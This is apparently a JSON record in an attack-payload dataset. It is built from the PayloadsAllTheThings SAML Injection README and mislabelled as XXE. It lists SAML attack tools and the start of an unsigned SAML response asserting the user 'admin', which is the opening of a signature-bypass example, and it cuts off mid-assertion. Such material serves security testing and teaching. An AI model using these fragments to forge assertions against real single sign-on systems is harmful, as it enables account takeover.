@@ -1,0 +1,27 @@
+{
+  "id": "xxe-5c474d2ade7f",
+  "category": "XXE",
+  "title": "README",
+  "description": "# SAML Injection\n\n> SAML (Security Assertion Markup Language) is an open standard for exchanging authentication and authorization data between parties, in particular, between an identity provider and a service provider. While SAML is widely used to facilitate single sign-on (SSO) and other federated authentication scenarios, improper implementation or misconfiguration can expose systems to various vulnerabilities.\n\n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n    * [Invalid Signat",
+  "payloads": [
+    "* [CompassSecurity/SAMLRaider](https://github.com/SAMLRaider/SAMLRaider) - SAML2 Burp Extension.",
+    "* [d0ge/XSW](https://github.com/d0ge/XSW) - XML Signature Wrapping Burp Suite Extensions.",
+    "* [ZAP Addon/SAML Support](https://www.zaproxy.org/docs/desktop/addons/saml-support/) - Allows to detect, show, edit, and fuzz SAML requests.",
+    "A SAML Response should contain the `<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"`.",
+    "> [...]accepting unsigned SAML assertions is accepting a username without checking the password - @ilektrojohn",
+    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
+    "<saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\" Destination=\"http://localhost:7001/saml2/sp/acs/post\" ID=\"id39453084082248801717742013\" IssueInstant=\"2018-04-22T10:28:53.593Z\" Version=\"2.0\">",
+    "<saml2:Issuer xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" Format=\"urn:oasis:names:tc:SAML:2.0:nameidformat:entity\">REDACTED</saml2:Issuer>",
+    "<saml2p:Status xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\">",
+    "<saml2p:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\" />",
+    "</saml2p:Status>",
+    "<saml2:Assertion xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"id3945308408248426654986295\" IssueInstant=\"2018-04-22T10:28:53.593Z\" Version=\"2.0\">",
+    "<saml2:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">REDACTED</saml2:Issuer>",
+    "<saml2:Subject xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">",
+    "<saml2:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified\">admin</saml2:NameID>"
+  ],
+  "references": [
+    "PayloadsAllTheThings/SAML Injection/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
